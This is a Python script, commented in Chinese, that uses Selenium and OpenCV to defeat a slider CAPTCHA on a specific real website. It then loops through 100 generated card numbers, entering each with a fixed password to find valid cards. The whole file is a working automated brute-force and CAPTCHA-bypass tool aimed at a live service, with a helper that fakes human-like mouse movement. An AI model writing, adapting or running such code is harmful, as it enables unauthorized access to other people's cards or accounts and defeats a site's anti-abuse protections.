import base64
import random
import time
import urllib.request

import cv2
import numpy as np
from PIL import Image
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver import ActionChains

import compare_cv2
import crop_cv


class Crab:
    """ 防水墙滑动验证码破解 使用OpenCV库 成功率大概90%左右"""

    def __init__(self):
        # 如果是实际应用中，可在此处账号和密码
        self.url = "http://xrj.360xie.cn"
        self.driver = webdriver.Chrome()

    @staticmethod
    def get_position(chunk, canves):
        """ 判断缺口位置 :param chunk: 缺口图片是原图 :param canves: :return: 位置 x, y """
        target = cv2.imread(chunk, 0)
        template = cv2.imread(canves, 0)
        # w, h = target.shape[::-1]
        temp = 'temp.jpg'
        targ = 'targ.jpg'
        cv2.imwrite(temp, template)
        cv2.imwrite(targ, target)
        target = cv2.imread(targ)
        target = cv2.cvtColor(target, cv2.COLOR_BGR2GRAY)
        target = abs(255 - target)
        cv2.imwrite(targ, target)

        target = cv2.imread(targ)
        template = cv2.imread(temp)
        print("target: ", target)
        print("template: ", template)
        result = cv2.matchTemplate(target, template, cv2.TM_CCOEFF_NORMED)
        x, y = np.unravel_index(result.argmax(), result.shape)
        return x, y

    @staticmethod
    def get_track(distance):
        """ 模拟轨迹 假装是人在操作 :param distance: :return: """
        # 初速度
        v = 1
        # 单位时间为0.2s来统计轨迹，轨迹即0.2内的位移
        t = 0.2
        # 位移/轨迹列表，列表内的一个元素代表0.2s的位移
        tracks = []
        # 当前的位移
        current = 0
        # 到达mid值开始减速
        mid = distance * 7 / 8
        distance += 10  # 先滑过一点，最后再反着滑动回来
        # a = random.randint(1,3)
        while current < distance:
            # if current < mid:
            #     # 加速度越小，单位时间的位移越小,模拟的轨迹就越多越详细
            #     a = random.randint(2, 4)  # 加速运动
            # else:
            #     a = -random.randint(3, 5)  # 减速运动

            a = random.randint(2, 4)
            # 初速度
            v0 = v
            # 0.2秒时间内的位移
            s = v0 * t + 2 * a * (t ** 2)
            # 当前的位置
            current += s
            # 添加到轨迹列表
            tracks.append(round(s))
            # 速度已经达到v,该速度作为下次的初速度
            v = v0 + a * t
        # 反着滑动到大概准确位置
        for i in range(4):
            tracks.append(-random.randint(2, 3))
        for i in range(4):
            tracks.append(-random.randint(1, 3))
        return tracks

    @staticmethod
    def urllib_download(imgurl, imgsavepath):
        """ 下载图片 :param imgurl: 图片url :param imgsavepath: 存放地址 :return: """
        from urllib.request import urlretrieve
        urlretrieve(imgurl, imgsavepath)

    def login_main(self, no_list):
        driver = self.driver
        driver.implicitly_wait(5)
        driver.get(self.url)
        # driver.maximize_window()

        for no in no_list:
            print("当前尝试的卡号：" + no)
            know_btn = driver.find_element(By.XPATH, '//*[@id="aNext"]')
            know_btn.click()
            card_no = driver.find_element(By.ID, 'txtCardNo')
            card_no.send_keys(no)
            card_psw = driver.find_element(By.ID, 'txtCardPsw')
            card_psw.send_keys("834114")
            btn_search = driver.find_element(By.ID, 'btnSearch')
            btn_search.click()

            # 等待，避免下载图片时图片未加载完毕，导致下载图片为空
            time.sleep(2)
            # 下载完整的滑动拼图
            # bk_block = driver.find_element(By.XPATH, '//img[@id="slideBg"]').get_attribute('src')  # 大图 url
            js = f'''return document.getElementsByTagName("canvas")[0].toDataURL("image/png");'''  # 数字表示第几个canvas
            base64str = driver.execute_script(js)
            page = base64str.split(',')[1]  # 去除前缀无用信息
            print("page: ", page)
            imagedata_bkBlock = base64.b64decode(page)
            with open("./img/bkBlock.png", "wb+") as f:
                f.write(imagedata_bkBlock)
                f.close()
            time.sleep(1)

            # 下载小滑块图
            # slide_block = driver.find_element(By.XPATH, '//img[@id="slideBlock"]').get_attribute('src')  # 小滑块 图片url
            js = f'''return document.getElementsByTagName("canvas")[1].toDataURL("image/png");'''  # 数字表示第几个canvas
            base64str = driver.execute_script(js)
            page = base64str.split(',')[1]  # 去除前缀无用信息
            imagedata_slideBlock = base64.b64decode(page)
            with open("./img/slideBlock.png", "wb+") as f:  # 下载大大图
                f.write(imagedata_slideBlock)
                f.close()
            time.sleep(1)

            slid_ing = driver.find_element(By.XPATH, '//*[@id="captcha"]/div[2]/div/div')  # 滑块
            # self.urllib_download(bk_block, './image/bkBlock.png')
            # self.urllib_download(slide_block, './image/slideBlock.png')
            # time.sleep(0.5)

            # 处理侧边栏图片
            crop_cv.main()

            # 使用opencv识别缺口位置，并移动滑块
            img_bkblock = Image.open('./img/bkBlock.png')
            real_width = img_bkblock.size[0]
            print("real_width: ", real_width)
            # width_scale = float(real_width) / float(web_image_width)
            width_scale = 1.0
            print("width_scale: ", width_scale)

            position = compare_cv2.identify_gap('./img/bkBlock.png', './img/tp.png', './img/out.png')
            # print("position: ", position)
            # real_position = position[1] / width_scale
            # real_position = real_position - (slide_block_x - bk_block_x)
            real_position = position + 5
            print("real_position: ", real_position)

            # track_list = self.get_track(real_position + 4)
            # print("track_list: ", track_list)
            ActionChains(driver).click_and_hold(on_element=slid_ing).perform()  # 点击鼠标左键，按住不放
            time.sleep(0.2)
            ActionChains(driver).move_by_offset(xoffset=real_position, yoffset=0).perform()
            # print('第二步,拖动元素')
            # for track in track_list:
            #     ActionChains(driver).move_by_offset(xoffset=track, yoffset=0).perform()  # 鼠标移动到距离当前位置（x,y）
            #     time.sleep(0.002)
            # ActionChains(driver).move_by_offset(xoffset=-random.randint(0, 1), yoffset=0).perform() # 微调，根据实际情况微调
            time.sleep(1)
            # print('第三步,释放鼠标')
            ActionChains(driver).release(on_element=slid_ing).perform()
            time.sleep(1)

            time.sleep(5)
            print(driver.switch_to.alert.text)
            driver.switch_to.alert.accept()

        driver.close()

    @staticmethod
    def random_no():
        head = "22118800"
        result = []
        # first = [0, 3, 6, 8, 9]
        first = [8]
        second = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
        last = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
        for i in first:
            for j in second:
                for m in last:
                    res = head + str(i) + "0" + str(j) + str(m)
                    result.append(res)
        return result


if __name__ == '__main__':
    c = Crab()
    NO_list = c.random_no()
    c.login_main(NO_list)
